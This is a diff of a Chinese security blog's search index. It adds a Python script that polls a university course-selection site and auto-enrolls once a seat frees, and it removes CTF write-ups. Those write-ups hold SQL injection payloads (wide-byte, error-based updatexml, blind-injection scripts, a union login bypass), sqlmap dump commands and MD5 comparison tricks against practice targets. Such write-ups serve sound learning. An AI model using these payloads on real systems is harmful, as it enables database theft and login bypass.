+<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">getCourseInfo</span>(<span class="hljs-params">session_client, course_KCDM</span>):</span>
+    <span class="hljs-string">&quot;&quot;&quot;</span>
+<span class="hljs-string">    获取指定课程的详细信息</span>
+<span class="hljs-string">    :param session_client:</span>
+<span class="hljs-string">    :param course_KCDM:</span>
+<span class="hljs-string">    :return:</span>
+<span class="hljs-string">    &quot;&quot;&quot;</span>
+    <span class="hljs-comment"># course_KCDM = &quot;&quot;</span>
+    course_infos = session_client.post(<span class="hljs-string">&quot;https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkCourse/loadJhnCourseInfo.do?query_keyword=&quot;</span> + course_KCDM,  verify = <span class="hljs-literal">False</span>)
+    course_json = json.loads(course_infos.text)[<span class="hljs-string">&quot;datas&quot;</span>]
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(course_json) == <span class="hljs-number">0</span>:
+
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
+    course_info = <span class="hljs-string">&quot;&quot;</span>
+    <span class="hljs-keyword">for</span> course <span class="hljs-keyword">in</span> course_json:
+        <span class="hljs-keyword">if</span> course_KCDM == course[<span class="hljs-string">&quot;KCDM&quot;</span>]:
+            course_info = course
+            <span class="hljs-keyword">break</span>
+    <span class="hljs-keyword">return</span> course_info</code></pre>
+
+<h2 id="3-监控容量并抢课"><a href="#3-监控容量并抢课" class="headerlink" title="3.监控容量并抢课"></a>3.监控容量并抢课</h2><h2 id="3-1-选课函数"><a href="#3-1-选课函数" class="headerlink" title="3.1 选课函数"></a>3.1 选课函数</h2><p>获取课程信息后，只要判断课程的容量与当前的选课人数的关系即可进行选课。点击选课按钮，发送的请求如下，可以看到加入<strong>csrfToken</strong>，那么就想办法找到它就能进行选课了。</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220909102145303.png" alt="image-20220909102145303"></p>
+<p>在刷新选课页面时，会出现<code>https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkHome/loadPublicInfo_course.do</code>，其返回的数据中就包含了csrfToken</p>
+<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220909102441128.png" alt="image-20220909102441128"></p>
+<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">chooseCourse</span>(<span class="hljs-params">course_BJDM</span>):</span>
+    <span class="hljs-string">&quot;&quot;&quot;</span>
+<span class="hljs-string">    选课函数，根据course_BJDM进行选课</span>
+<span class="hljs-string">    :param course_BJDM:</span>
+<span class="hljs-string">    :return:</span>
+<span class="hljs-string">    &quot;&quot;&quot;</span>
+    csrf_token_url = <span class="hljs-string">&quot;https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkHome/loadPublicInfo_course.do&quot;</span>
+    csrf_response = session_client.get(csrf_token_url).text
+    json_csrf_res = json.loads(csrf_response)
+    csrf_token = json_csrf_res.get(<span class="hljs-string">&quot;csrfToken&quot;</span>)
+    choose_course_url = <span class="hljs-string">&quot;https://yjspt.xidian.edu.cn/yjsxkapp/sys/xsxkapp/xsxkCourse/choiceCourse.do?bjdm=&#123;0&#125;&amp;csrfToken=&#123;1&#125;&amp;lx=0&quot;</span>.<span class="hljs-built_in">format</span>(course_BJDM, csrf_token)
+    choose_response = session_client.get(choose_course_url, verify = <span class="hljs-literal">False</span>).text
+    <span class="hljs-comment"># print(choose_response)</span>
+    <span class="hljs-keyword">return</span> json.loads(choose_response)[<span class="hljs-string">&quot;code&quot;</span>]</code></pre>
+
+<h2 id="3-2-监控容量并抢课"><a href="#3-2-监控容量并抢课" class="headerlink" title="3.2 监控容量并抢课"></a>3.2 监控容量并抢课</h2><p>为了防止登录的session过期可以设置一个定时任务，每个十二小时启动一次该脚本。</p>
+<pre><code class="hljs python"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    KCDM = course_KCDM
+    session_client = getSession()
+    course_info = getCourseInfo(session_client = session_client, course_KCDM = KCDM)
+    <span class="hljs-keyword">if</span> course_info == <span class="hljs-literal">None</span>:
+        print(<span class="hljs-string">&quot;[+] 未查询到课程信息，请检查课程代码！&quot;</span>)
+        quit()
+    course_KXRS = course_info[<span class="hljs-string">&quot;KXRS&quot;</span>]  <span class="hljs-comment"># 课程总容量</span>
+    course_DQRS = course_info[<span class="hljs-string">&quot;DQRS&quot;</span>]  <span class="hljs-comment"># 当前选课人数</span>
+
+    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
+        <span class="hljs-keyword">if</span> course_DQRS &lt; course_KXRS:
+            course_BJDM = course_info[<span class="hljs-string">&quot;BJDM&quot;</span>]
+            code = chooseCourse(course_BJDM)
+            <span class="hljs-keyword">if</span> code == <span class="hljs-number">1</span>:
+                print(<span class="hljs-string">&quot;[+] 选课成功!&quot;</span>)
+                print(<span class="hljs-string">&quot;[+] 课程信息如下:&quot;</span>)
+                printCourseInfo(course_info)
+                quit()
+            <span class="hljs-keyword">else</span>:
+                print(<span class="hljs-string">&quot;[+] 选课失败!&quot;</span>)
+        <span class="hljs-keyword">else</span>:
+            print(<span class="hljs-string">&quot;[+] 当前课程容量已满!&quot;</span>)
+            time.sleep(sleep_time)    <span class="hljs-comment"># 每60s查询一次</span>
+            <span class="hljs-keyword">continue</span>
+        <span class="hljs-comment"># 监控选课人数的变化</span>
+        course_info = getCourseInfo(session_client=session_client, course_KCDM = KCDM)
+        course_KXRS = course_info[<span class="hljs-string">&quot;KXRS&quot;</span>]  <span class="hljs-comment"># 课程总容量</span>
+        course_DQRS = course_info[<span class="hljs-string">&quot;DQRS&quot;</span>]  <span class="hljs-comment"># 当前选课人数</span>
+    print(<span class="hljs-string">&quot;[+] Finish&quot;</span>)</code></pre>
 
 
-<p> 对上传的值进行了过滤key, kekeyy可以绕过</p>
-<p> 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等<br> payload:  <code>?kekey1[]=da&amp;kekey2[]=dada</code></p>
-<p> 2.利用==比较漏洞</p>
-<p> 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
-<p> 下列的字符串的MD5值都是0e开头的：</p>
-<pre><code>QNKCDZO
 
-240610708
-
-s878926199a
-
-s155964671a
-
-s214587387a
-
-s214587387a</code></pre><hr>
-<h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>爆数据库名</p>
-<p>   <code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,database() --+</code></p>
-<p>database:<strong>web1002-1</strong></p>
-<p>爆表名</p>
-<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+</code></pre><p>flag1,hint</p>
-<p>爆字段名</p>
-<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name= &apos;flag1&apos;  --+</code></pre><p>flag1,address<br>获取内容</p>
-<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(flag1) from flag1 --+</code></pre><p><strong>usOwycTju+FTUUzXosjr</strong></p>
-<p>提交发现不对</p>
-<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(address) from flag1 --+</code></pre><p>获取address中的内容</p>
-<p>./Once_More.php<br>下一关地址<br>得到另外一个地址</p>
-<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) %23</code></pre><p>给出提示<br>XPATH syntax error: ‘<del>class,flag2</del>‘</p>
-<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=flag2),&apos;~&apos;),3) %23</code></pre><p>Unknown column ‘flag2’ in ‘where clause’</p>
-<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(flag2) from flag2),&apos;~&apos;),3) %23</code></pre><p>XPATH syntax error: ‘<del>flag{Bugku-sql_6s-2i-4t-bug}</del>‘</p>
-<p><strong>！！！注意把flag改为小写字母</strong></p>
-<hr>
-<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>靶场：<a href="靶场：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p>
-<h3 id="一、手工注入"><a href="#一、手工注入" class="headerlink" title="一、手工注入"></a>一、手工注入</h3><p>第一步</p>
-<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code></pre><p>加单引号报错</p>
-<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,table_name from information_schema.tables where  table_schema=database()%23</code></pre><p>查看所有的表</p>
-<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(table_name) from information_schema.tables where  table_schema=database()%23</code></pre><p>查看表中的列</p>
-<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(column_name) from information_schema.columns where  table_name=0x637466 %23
-ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
-<p>获取字段内容</p>
-<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(pw) from ctf %23</code></pre><p><strong>flag:</strong><br><strong>nctf{h4cked_By_w00dPeck3r}</strong></p>
-<h3 id="二、sqlmap注入"><a href="#二、sqlmap注入" class="headerlink" title="二、sqlmap注入"></a>二、sqlmap注入</h3><p>检测是否有注入点</p>
-<p><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code><br>没有成功<br>使用十六进制</p>
-<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex</code></pre><p>获取数据库名</p>
-<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex
- --dbs //选择十六进制 获取数据库名 单引号使用url编码</code></pre><p>获取表名</p>
-<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex --D sae-chinalover --tables</code></pre><p>获取flag</p>
-<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex -D sae-chinalover -T ctf --dump</code></pre><p><img src="/2020/08/08/Bugku/k1.png" alt></p>
 ]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>sql</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>guestbook</title>
-    <url>/2020/04/18/Guestbook/</url>
-    <content><![CDATA[<h1 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a><a href="https://hackme.inndy.tw/gb/?mod=new">guestbook</a></h1><span id="more"></span>
-<p>题目提示：<strong>This guestbook sucks. sqlmap is your friend.</strong> 是sql注入<br>点击Message List 时是空的， 点击post是可以提交新信息，点击查看新信息</p>
-<p>在id值后加上” ‘ “测试是否存在测试点网页报错说明存在注入点<br>union 注入!<br>查看列</p>
-<pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>hackme.inndy.tw<span class="hljs-regexp">/gb/</span>?mod=read&amp;id=-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>%<span class="hljs-number">20</span><span class="hljs-comment">#</span>
-<span class="hljs-regexp">//i</span>d=-<span class="hljs-number">1</span> 是让前面的内容不显示</code></pre>
-<p>3被回显</p>
-<p>1.查看数据库名</p>
-<pre><code class="hljs apache"><span class="hljs-attribute">https</span>://hackme.inndy.tw/gb/?mod=read&amp;id=-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,database(),<span class="hljs-number">4</span>%<span class="hljs-number">20</span>#</code></pre>
-
-<p>数据库的名字<code>g8</code></p>
-<p>2.查看表名</p>
-<pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>
-<p>发现有一个表 <code>flag</code></p>
-<p>3.测试表的字段</p>
-<pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>
-<p>仍然显示<code>flag</code></p>
-<p>4.读取flag   </p>
-<pre><code class="hljs apache"><span class="hljs-attribute">https</span>://hackme.inndy.tw/gb/?mod=read&amp;id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(select flag from flag limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre>
-
-<p>得到flag!</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-      </tags>
   </entry>
   <entry>
     <title>arp attack</title>
@@ -461,214 +668,6 @@ ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
       </categories>
       <tags>
         <tag>LFI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>buuctf-sql注入</title>
-    <url>/2020/10/05/buuoj/</url>
-    <content><![CDATA[<h1 id="buuctf–注入篇"><a href="#buuctf–注入篇" class="headerlink" title="buuctf–注入篇"></a>buuctf–注入篇</h1><span id="more"></span>
-
-<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>给了提示，<code>All You Want Is In Table &#39;flag&#39; and the column is &#39;flag&#39;</code></p>
-<p>猜测flag在flag 表中，查询语句应该是 select flag from flag</p>
-<p>经过测试，发现这题过滤了很多关键字，or,union,order等，猜测是盲注</p>
-<p><img src="https://i.loli.net/2020/11/30/gJAqhVCpN8nYvs1.png" alt></p>
-<p>构造盲注语句</p>
-<p><code>id=if((ascii(substr((select(flag)from(flag)),0,1))&gt;90),1,2)</code></p>
-<p><img src="https://i.loli.net/2020/11/30/YGtuAcFr2sHZUdD.png" alt></p>
-<p><img src="https://i.loli.net/2020/11/30/oUqeZdHLfJCQPgr.png" alt></p>
-<p>两次的提示语句不一样，说明这个注入语句是对的，且当提示Hello时应该是对的。</p>
-<pre><code class="hljs python">// 二分注入
-<span class="hljs-keyword">import</span> requests
-
-url = <span class="hljs-string">&quot;http://376688f4-59c4-4f47-8d0e-36c966e45631.node3.buuoj.cn/index.php&quot;</span>
-
-data = &#123;<span class="hljs-built_in">id</span> : <span class="hljs-string">&quot;&quot;</span>&#125;
-
-flag = <span class="hljs-string">&quot;&quot;</span>
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):
-    left = <span class="hljs-number">33</span>
-    right = <span class="hljs-number">128</span>
-    mid = (right + left) &gt;&gt; <span class="hljs-number">1</span>
-    <span class="hljs-keyword">while</span>(right&gt;left):
-
-        data[<span class="hljs-string">&quot;id&quot;</span>] = <span class="hljs-string">&quot;if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;),1,2)&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)
-        response = requests.post(url,data=data)
-        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> response.text:
-            left = mid+<span class="hljs-number">1</span>
-        <span class="hljs-keyword">else</span>:
-            right = mid
-        mid=(right+left)&gt;&gt;<span class="hljs-number">1</span>
-    flag = flag + <span class="hljs-built_in">chr</span>(mid)
-    print(flag)
-
-print(flag)</code></pre>
-
-
-
-
-
-<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p><strong>报错注入</strong></p>
-<p>测试发现<code>or,union,substr,空格,/**/</code>等都被加入黑名单，双写也无法绕过</p>
-<p><img src="https://i.loli.net/2020/11/30/uHTdrgxB7I8QLDK.png" alt></p>
-<p>可是使用报错注入</p>
-<blockquote>
-<p>报错注入原理：</p>
-<p>其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。</p>
-</blockquote>
-<p>相关链接</p>
-<p><a href="https://www.cnblogs.com/richardlee97/p/10617115.html">https://www.cnblogs.com/richardlee97/p/10617115.html</a></p>
-<p><a href="https://www.jianshu.com/p/d8ae3e8dabdc">https://www.jianshu.com/p/d8ae3e8dabdc</a></p>
-<p><a href="https://blog.csdn.net/qq_37873738/article/details/88042610">https://blog.csdn.net/qq_37873738/article/details/88042610</a></p>
-<blockquote>
-<p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) 。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据 </p>
-</blockquote>
-<p>查询语句如下</p>
-<pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">table_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">tables</span>)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>
-
-?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">column_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">columns</span>)<span class="hljs-keyword">where</span>(<span class="hljs-built_in">table_name</span>)<span class="hljs-keyword">like</span>(<span class="hljs-string">&#x27;H4rDsq1&#x27;</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>
-
-?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span>(H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre>
-
-<p>这里会发现flag显示不全，可能是报错现实的字数限制，利用right/left函数，显示部分的flag，之后拼接起来</p>
-<p>显示后面的flag</p>
-<pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(right(<span class="hljs-keyword">password</span>,<span class="hljs-number">30</span>))<span class="hljs-keyword">from</span>(geek.H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre>
-
-
-
-<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>sql注入+反序列化+代码审计</p>
-<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>下载的源码，有助于后面做题</p>
-<pre><code class="hljs php">mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&#x27;SET NAMES UTF8&#x27;</span>);
-<span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];
-<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pw&#x27;</span>];
-<span class="hljs-variable">$t_pw</span> = md5(<span class="hljs-variable">$password</span>);     <span class="hljs-comment">//对传入的password参数进行了md5加密</span>
-<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;
-<span class="hljs-comment">// echo $sql;</span>
-<span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);
-
-<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\(|\)|\=|or/&quot;</span>, <span class="hljs-variable">$name</span>))&#123;  <span class="hljs-comment">//  过滤了() | = or </span>
-	<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;do not hack me!&quot;</span>);
-&#125;
-<span class="hljs-keyword">else</span>&#123;
-	<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>) &#123;
-		printf(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, mysqli_error(<span class="hljs-variable">$con</span>));
-		<span class="hljs-keyword">exit</span>();
-	&#125;
-	<span class="hljs-keyword">else</span>&#123;
-		<span class="hljs-comment">// echo &#x27;&lt;pre&gt;&#x27;;</span>
-		<span class="hljs-variable">$arr</span> = mysqli_fetch_row(<span class="hljs-variable">$result</span>);
-		<span class="hljs-comment">// print_r($arr);</span>
-		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;
-			<span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$password</span>) == <span class="hljs-variable">$arr</span>[<span class="hljs-number">2</span>])&#123;    <span class="hljs-comment">//</span>
-				<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
-			&#125;
-			<span class="hljs-keyword">else</span>&#123;
-				<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong pass!&quot;</span>);
-			&#125;
-		&#125;
-		<span class="hljs-keyword">else</span>&#123;
-			<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong user!&quot;</span>);
-		&#125;
-	&#125;
-&#125;</code></pre>
-
-<p>随便输入用户名和密码，查看源码，出现提示</p>
-<p><img src="https://i.loli.net/2020/11/30/yMceIJS4DYLHsh6.png" alt></p>
-<p>试了试应该是base32，解码后是base64</p>
-<pre><code class="hljs gcode">c<span class="hljs-number">2</span><span class="hljs-attr">VsZWN0</span>ICogZ<span class="hljs-symbol">nJvbSB1</span>c<span class="hljs-number">2</span>VyIHdoZXJlIHVzZXJuYW<span class="hljs-number">1</span>lID<span class="hljs-number">0</span>gJyRuYW<span class="hljs-number">1</span>lJw==</code></pre>
-
-<p>继续解码</p>
-<pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;$name&#x27;</span></code></pre>
-
-<p>注入点是name参数这里，与上面源码中的查询语句一样。</p>
-<p>经过测试发现有三列，<code>name=admin&#39; union select 1,2,3 #&amp;pw=as#</code>显示正常，<code>name=admn&#39; union select 1,2,3,4#&amp;pw=as</code>报错</p>
-<p>但是页面没有数字回显，所以常规的注入应该是不行的。</p>
-<p>值得注意的是，这题可以知道username是admin，</p>
-<p>输入username=admin&amp;password=11,时提示wrong pass!</p>
-<p>输入username=admn&amp;password=11,时提示wrong user!，所以可以判断用户名为admin</p>
-<p>接下来介绍一种新的union注入</p>
-<p>先建立一张表</p>
-<p><img src="https://i.loli.net/2020/11/30/9bS4DTXuCfmxykg.png" alt></p>
-<pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;2322&#x27;</span>;</code></pre>
-
-<p>union语句后查询的是表中不存在的一个数据，查询结果如下</p>
-<p><img src="https://i.loli.net/2020/11/30/n6EeYVXdCxH72oO.png" alt></p>
-<p><strong>这个结果说明，union查询一个不存在的数据时，会建立一个虚拟表</strong>，其中放着所查询到的数据和union后包含的数据</p>
-<p>这里就是 id=1,username=admin,password=2322</p>
-<p>这样就可以利用这个改变数据库中用户的密码，然后用自己设置的密码登录</p>
-<p>接下来，利用这点做这个题目，首先知道一共三列，第一列应该是id，知道之后两列的内容就可以了</p>
-<p><code>name=adm&#39; union select 1,&#39;a&#39;,&#39;s&#39; #&amp;pw=11</code>提示的wrong user!</p>
-<p><code>name=adm&#39; union select 1,&#39;admin&#39;,&#39;s&#39; #&amp;pw=11</code>提示的wrong pass!</p>
-<p>第二列的字段名应该就是username，第三列自然就是password，但是这题的password字段存放的时md5加密后的内容<strong>（看到师傅们的wp才知道的，看到源码也确实这样，但是在比赛的时候这么发现不得而知）</strong></p>
-<p>payload:</p>
-<pre><code class="hljs apache"><span class="hljs-attribute">name</span>=<span class="hljs-number">000</span>&#x27;union select <span class="hljs-number">1</span>,&#x27;admin&#x27;,&#x27;b<span class="hljs-number">59</span>c<span class="hljs-number">67</span>bf<span class="hljs-number">196</span>a<span class="hljs-number">4758191</span>e<span class="hljs-number">42</span>f<span class="hljs-number">76670</span>ceba&#x27;#&amp;pw=<span class="hljs-number">1111</span></code></pre>
-
-<p><code>b59c67bf196a4758191e42f76670ceba</code>是1111的md5值，pw的值为1111</p>
-<p><img src="https://i.loli.net/2020/11/30/Xhp1PgH7QlejDYn.png" alt></p>
-<h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>与hard sql是一个系列的，但是这个应该是盲注</p>
-<p>在search.php中找到注入点，测试可以发现是数字型注入</p>
-<p> fuzz之后可以发现对于不同的字符，回显不同，并且过滤了空格，但是<code>^</code>没有被过滤，所以可以利用这个符号</p>
-<p>可以看到当id = 1 时，页面回显为，可以将这个为判断的标志</p>
-<p><img src="https://i.loli.net/2020/12/23/DO6SQjuJLqm9ycM.png" alt="image-20201223090038080"></p>
-<pre><code class="hljs apache"><span class="hljs-attribute">1</span>^<span class="hljs-number">1</span>^<span class="hljs-number">1</span> = <span class="hljs-number">1</span>
-<span class="hljs-attribute">1</span>^<span class="hljs-number">0</span>^<span class="hljs-number">1</span> = <span class="hljs-number">0</span></code></pre>
-
-<p>所以可以将注入的payload加到中间，例如</p>
-<pre><code class="hljs perl"><span class="hljs-number">1</span>^(<span class="hljs-keyword">ord</span>(<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span>(group_concat(schema_name))from(information_schema.schema
-ta)),%d,<span class="hljs-number">1</span>))=%d)^<span class="hljs-number">1</span><span class="hljs-string">&quot;%(i,ord(j))</span></code></pre>
-
-<p>注入脚本如下，使用的是二分法</p>
-<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
-<span class="hljs-keyword">import</span> time
-
-url = <span class="hljs-string">&quot;http://6b5514f4-7df0-47b1-bca4-d13013ffd5d9.node3.buuoj.cn/search.php&quot;</span>
-flag = <span class="hljs-string">&#x27;&#x27;</span>
-
